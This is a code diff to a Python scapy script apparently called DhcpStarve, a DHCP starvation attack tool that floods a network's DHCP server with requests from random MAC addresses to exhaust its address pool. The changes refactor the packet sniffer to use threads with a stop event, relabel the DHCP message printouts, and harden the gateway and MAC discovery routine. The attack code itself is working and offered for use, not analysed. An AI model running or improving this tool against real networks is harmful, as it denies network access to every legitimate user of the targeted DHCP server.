@@ -1,7 +1,7 @@
 #!/usr/bin/python3
    
 from scapy.all import *
-import multiprocessing 
+from threading import Thread, Event
 from time import sleep
 import curses
 import os
@@ -12,40 +12,48 @@ class DhcpStarve:
     def __init__(self):
         '''Preparation'''
         self.starvedIPs = []
+        self.stop_sniffer = Event()     #to stop scapy sniff in method listen()
     
     def listen(self):
         '''Sniff for dhcp packets.'''
         sniff(filter="udp and (port 67 or port 68)",
               prn=self.handle_dhcp,
-              store=0)
-              
+              store=0,
+              stop_filter=self.should_stop_sniffer)
+        
+    def should_stop_sniffer(self, packet):
+        return self.stop_sniffer.isSet()  #to stop scapy sniff in method listen()
+    
     def handle_dhcp(self, pkt):
         '''Reacts to dhcp response.'''
-        if pkt[DHCP]:         
+        if pkt[DHCP]:
+            print('')
             if pkt[DHCP].options[0][1]==5:                 #5 is DHCPACK
                 self.starvedIPs.append(pkt[IP].dst)
                 print(str(pkt[IP].dst)+" succesfully registered")
             elif pkt[DHCP].options[0][1]==6:               #6 is DHCPNAK
-                print("NAK received: ", end="")
+                print("DHCP NAK: ", end="")
                 print(pkt[DHCP].options[2][1].decode())    #error msg
             elif pkt[DHCP].options[0][1]==2:               #2 is DHCPOFFER
-                print("Offer received: \n{}".format(pkt[DHCP].options))
+                print("DHCP OFFER:: \n{}".format(pkt[DHCP].options))
             elif pkt[DHCP].options[0][1]==3:               #3 is DHCPREQUEST
-                print("Request received: \n{}".format(pkt[DHCP].options))
+                print("DHCP REQUEST: \n{}".format(pkt[DHCP].options))
+            elif pkt[DHCP].options[0][1]==1:               #3 is DHCPDISCOVER
+                print("DHCP DISCOVER: \n{}".format(pkt[DHCP].options))
             else:
-                print ("Received pkt with dhcp options: {}".format(pkt[DHCP].options))
-            return True
+                print ("DHCP with options: {}".format(pkt[DHCP].options))
+            
         else: return False
 
     def _sniff_wrapper(sendPacketMethod):
         '''Launches sniffing process around another passed method'''
-        def wrapper(self, *args, **kwargs):
-            listenProcess = multiprocessing.Process(target=self.listen)
+        def wrapper(self,*args, **kwargs):
+            listenProcess = Thread(target=self.listen)
             listenProcess.start()
             sleep(0.5)
-            sendPacketMethod(self, *args, **kwargs)
+            sendPacketMethod(self,*args, **kwargs)
             sleep(0.5)
-            listenProcess.terminate()
+            self.stop_sniffer.set() #to stop scapy sniff in method listen()
             input('Press Enter to come back to menu.')
         return wrapper  
  
@@ -69,7 +77,7 @@ class DhcpStarve:
             dhcpRequest/= IP(src='0.0.0.0', dst='255.255.255.255')
             dhcpRequest/= UDP(dport=67, sport=68)
             dhcpRequest/= BOOTP(chaddr=RandString(12, b"0123456789abcdef"),xid=RandInt())
-            dhcpRequest /= DHCP(options=[("message-type", "request"),
+            dhcpRequest/= DHCP(options=[("message-type", "request"),
                                              ("requested_addr", requestedIP),
                                              ("server_id", "192.168.31.1"),
                                              "end"])
@@ -95,10 +103,10 @@ class DhcpStarve:
                                          ("server_id", srcIP),
                                          "end"])
                                                                
-                                  
+    @_sniff_wrapper                            
     def sniffing(self):
         '''Just snffing with _sniff_wrapper method '''
-        print('Starting sniffing for DHCP packets on interface: {} for 60 sec'.format(LOCALIFACE))
+        print('Starting sniffing for DHCP packets on interface: {}'.format(LOCALIFACE))
         input('Press Enter to stop')
     
     def nextIP(self,startIP,limit):
@@ -227,25 +235,42 @@ class Menu:
 
 
 def get_network_def():
-    """Read the default gateway directly from /proc."""
+    """Read the default gateway directly from /proc, returns dict {'defGW':.., 'dev':.., 'GWmac':.., 'mac':..}"""
+    subprocess.run(['ping','-c','1','4.2.2.2'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)  #to get some ARP entry for default gateway
     output={}
-    with open("/proc/net/route") as fh:
-        for line in fh:
-            fields = line.strip().split()
-            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
-                continue
-            output.update({'defGW': socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))})
+    #Default gateway ip
+    try:
+        with open("/proc/net/route") as fh:
+            for line in fh:
+                fields = line.strip().split()
+                if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                    continue
+                output.update({'defGW': socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))})
+    except Exception as e:
+        print('Error while checking default gateway in /proc/net/route')
+        print(e.message, e.args)
+    #Interface name and MAC of default gateway
+    try:
+        with open("/proc/net/arp") as fh:
+            for line in fh:
+                if output.get('defGW') == line.split()[0]:
+                    output.update({'dev': line.split()[5].strip()})
+                    output.update({'GWmac': line.split()[3]})
+                    break
+    except Exception as e:
+        print('Error while checking default gateway in /proc/net/arp')
+        print(e.message, e.args)
+    #Interface MAC        
+    try:
+        with open("/sys/class/net/{}/address".format(output.get('dev'))) as fh:
+            for line in fh:
+                output.update({'mac': line.strip()})
+    except Exception as e:
+        print('Error while checking mac address in /sys/class/net/{}/address'.format(output.get('dev')))
+        print(e.message, e.args)
 
-    with open("/proc/net/arp") as fh:
-        for line in fh:
-            if output.get('defGW') in line:
-                output.update({'dev': line.split()[5].strip()})
-                output.update({'GWmac': line.split()[3]})
-    
-    with open("/sys/class/net/{}/address".format(output.get('dev'))) as fh:
-        for line in fh:
-            output.update({'mac': line.strip()})
-        return output
+
+    return output
 
 
 # configuration
@@ -261,4 +286,6 @@ def main():
         
 if __name__ == '__main__':
 	main()
+
+
 
